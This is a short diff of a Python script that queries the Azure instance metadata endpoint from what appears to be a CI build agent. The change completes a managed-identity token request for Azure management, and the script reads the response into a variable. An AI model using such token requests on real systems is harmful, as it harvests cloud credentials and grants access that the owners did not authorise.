@@ -46,7 +46,7 @@ if __name__ == "__main__":
   
 
     cmd='curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13">/mnt/vss/_work/_temp/test.json'
-    url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+    url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
     headers = {'Metadata': 'true'}
     response = requests.get(url, headers=headers)
     env_text=response.text   
